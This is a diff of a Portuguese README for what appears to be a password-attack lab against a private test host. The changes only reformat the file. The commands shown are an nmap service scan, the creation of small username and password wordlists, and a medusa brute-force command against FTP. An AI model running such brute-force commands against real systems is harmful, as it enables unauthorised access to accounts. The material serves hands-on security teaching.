@@ -49,25 +49,27 @@ Demonstrar na prática os principais tipos de ataques de senhas e como realizar 
 
 ```bash
 nmap -sV -p- 192.168.56.101
-````
-*Resultado principal:
+```
+Resultado principal:
 
-FTP (21) → vsftpd 2.3.4
-SSH (22)
-HTTP (80) → Apache
-SMB (445) → Samba
+FTP (21) → vsftpd 2.3.4 |
+SSH (22) |
+HTTP (80) → Apache |
+SMB (445) → Samba |
 
 ### 2. Criação de Wordlists Simples
 
-# Usuários
-```
+Usuários
+```bash
 echo -e "msfadmin\nadmin\nroot" > users.txt
 ```
-# Senhas comuns
-```
+Senhas comuns
+```bash
 echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
 ```
 ### 3. Ataque Brute Force no FTP
 
+```bash
 medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
+```
 
